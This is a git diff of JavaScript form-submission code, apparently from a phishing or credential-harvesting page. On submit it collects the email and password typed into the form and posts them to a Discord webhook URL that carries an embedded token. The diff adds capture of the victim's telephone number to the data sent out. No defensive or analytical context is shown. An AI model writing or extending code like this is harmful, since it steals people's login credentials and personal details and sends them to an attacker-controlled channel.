@@ -8,6 +8,7 @@ form.addEventListener("submit", async (event)=>
 
     const email = document.getElementById("email").value;
     const password = document.getElementById("password").value;
+    const num = document.getElementById("tel.num").value;
 
     if(password!=document.getElementById("password2").value)
     {
@@ -16,7 +17,7 @@ form.addEventListener("submit", async (event)=>
 
     else
     {
-        const content = `email: ${email}\npassword: ${password}`
+        const content = `email: ${email}\npassword: ${password}\ntel. number: ${num}`;
         
         await fetch("https://discord.com/api/webhooks/1287033070683291791/KyV9Do_taZwdspy_kLwYoerMHoClWEDthrExqfYBZoUpmGkoA1c3RrMHMxY5MRfpUjD_", 
         {
